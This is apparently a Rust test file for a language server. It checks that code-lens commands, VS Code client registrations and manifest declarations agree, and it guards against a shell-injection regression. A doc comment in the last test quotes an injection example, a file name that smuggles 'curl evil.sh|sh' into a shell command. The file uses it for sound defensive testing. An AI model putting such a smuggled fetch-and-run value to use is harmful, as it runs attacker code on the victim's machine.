//! The contract between the language server and the VS Code client.
//!
//! **Why this file exists.** The server has emitted a `delulu.authority` code lens since Stage 8.
//! No client ever registered that command, so clicking the lens raised
//! *"command 'delulu.authority' not found"* — for the whole life of the feature, in the one editor
//! surface the project ships. Nothing failed, because nothing compared the two sides: the server is
//! Rust, the client is JavaScript, and no test read both.
//!
//! A lens the editor cannot execute is worse than no lens: the server advertises an action, the
//! user clicks it, and the tool reports its own internal error. So the three lists — commands the
//! server emits, commands the client registers, commands the manifest declares — must be equal, and
//! this test is what makes "equal" checkable rather than remembered.
//!
//! It is a source scrape by design. The alternative is launching VS Code, which cannot run in this
//! project's CI, and a scrape that reads the real files catches the real drift.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

fn repo_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("..").join("..")
}

fn read(rel: &str) -> String {
    let p = repo_root().join(rel);
    std::fs::read_to_string(&p).unwrap_or_else(|e| panic!("cannot read {}: {e}", p.display()))
}

/// Every `"command": "delulu.…"` the server puts in a code lens or names in `execute_command`.
fn commands_the_server_emits(src: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for (i, _) in src.match_indices("\"delulu.") {
        let rest = &src[i + 1..];
        if let Some(end) = rest.find('"') {
            let name = &rest[..end];
            // `delulu.serverPath` and friends are configuration keys, not commands; commands are
            // the ones that appear as a `"command":` value or an `execute_command` comparison.
            let before = &src[..i];
            let is_command_position = before.trim_end().ends_with("\"command\":")
                || before.trim_end().ends_with("Some(")
                || before.trim_end().ends_with("!= Some(");
            if is_command_position {
                out.insert(name.to_string());
            }
        }
    }
    out
}

/// Every command the JS client passes to `registerCommand`.
fn commands_the_client_registers(src: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for (i, _) in src.match_indices("registerCommand(\"") {
        let rest = &src[i + "registerCommand(\"".len()..];
        if let Some(end) = rest.find('"') {
            out.insert(rest[..end].to_string());
        }
    }
    out
}

/// Every command declared in `contributes.commands`.
fn commands_the_manifest_declares(pkg: &serde_json::Value) -> BTreeSet<String> {
    pkg["contributes"]["commands"]
        .as_array()
        .map(|a| {
            a.iter().filter_map(|c| c["command"].as_str().map(str::to_string)).collect()
        })
        .unwrap_or_default()
}

#[test]
fn every_lens_the_server_emits_is_a_command_the_editor_can_actually_run() {
    let server = commands_the_server_emits(&read("crates/delulu/src/lsp.rs"));
    let client = commands_the_client_registers(&read("editors/vscode/extension.js"));
    let pkg: serde_json::Value =
        serde_json::from_str(&read("editors/vscode/package.json")).expect("package.json parses");
    let manifest = commands_the_manifest_declares(&pkg);

    assert!(
        !server.is_empty(),
        "found no commands in lsp.rs — the scrape broke, and a scrape that finds nothing would \
         pass this test forever while checking nothing"
    );

    let unregistered: Vec<_> = server.difference(&client).collect();
    assert!(
        unregistered.is_empty(),
        "the server emits {unregistered:?} but the VS Code client registers no handler — clicking \
         that lens raises \"command not found\".\n  server:   {server:?}\n  client:   {client:?}"
    );

    let undeclared: Vec<_> = client.difference(&manifest).collect();
    assert!(
        undeclared.is_empty(),
        "extension.js registers {undeclared:?} but package.json does not declare them in \
         `contributes.commands`, so they are invisible in the Command Palette.\n  \
         client:   {client:?}\n  manifest: {manifest:?}"
    );

    let phantom: Vec<_> = manifest.difference(&client).collect();
    assert!(
        phantom.is_empty(),
        "package.json declares {phantom:?} with nothing registering them — the palette would offer \
         a command that fails when chosen"
    );
}

/// The extension ships inside this repository and under its licence. It claimed `MIT` at version
/// `0.8.0` while the workspace was Apache-2.0 at 1.0.0 — a licence statement that contradicts the
/// LICENSE file beside it is a distribution problem, not a cosmetic one.
#[test]
fn the_extension_manifest_agrees_with_the_workspace_it_ships_from() {
    let pkg: serde_json::Value =
        serde_json::from_str(&read("editors/vscode/package.json")).expect("package.json parses");
    let cargo = read("Cargo.toml");

    let field = |key: &str| -> String {
        cargo
            .lines()
            .find_map(|l| l.strip_prefix(&format!("{key} = ")))
            .unwrap_or_else(|| panic!("workspace Cargo.toml has no `{key}`"))
            .trim()
            .trim_matches('"')
            .to_string()
    };

    assert_eq!(
        pkg["version"].as_str().unwrap_or_default(),
        field("version"),
        "the VS Code extension version has drifted from the workspace version"
    );
    assert_eq!(
        pkg["license"].as_str().unwrap_or_default(),
        field("license"),
        "the VS Code extension declares a different licence than the workspace it ships from"
    );
    assert_eq!(
        pkg["repository"]["url"].as_str().unwrap_or_default(),
        field("repository"),
        "the VS Code extension points at a different repository than the workspace"
    );
}

/// A regression guard for a real vulnerability: the client built a shell command *string* out of
/// the open file's path (`` `${serverPath} run ${fsPath}` ``) and sent it to the user's shell. A
/// file named `x;curl evil.sh|sh.delulu` executed on click, and any path containing a space ran
/// the wrong command. Paths come from editor tabs, so they are attacker-influenced the moment a
/// project is opened from a clone. The fix passes an **argv array**; this pins that it stays one.
#[test]
fn the_client_never_builds_a_shell_command_string_from_a_path() {
    let js = read("editors/vscode/extension.js");
    assert!(
        !js.contains("sendText("),
        "extension.js uses `sendText(...)`, which hands a STRING to the user's shell. Paths \
         interpolated into it are shell syntax — build an argv array (`shellArgs`) instead."
    );
    assert!(
        js.contains("shellArgs"),
        "extension.js no longer passes an argv array; the injection-safe execution path is gone"
    );
    // The fsPath must never appear inside a template literal — that is the interpolation shape.
    for line in js.lines() {
        let l = line.trim();
        if l.starts_with("//") || l.starts_with("*") {
            continue;
        }
        assert!(
            !(l.contains("${") && l.contains("fsPath")),
            "a file path is interpolated into a template literal, which is how the injection \
             was built the first time: {l}"
        );
    }
}
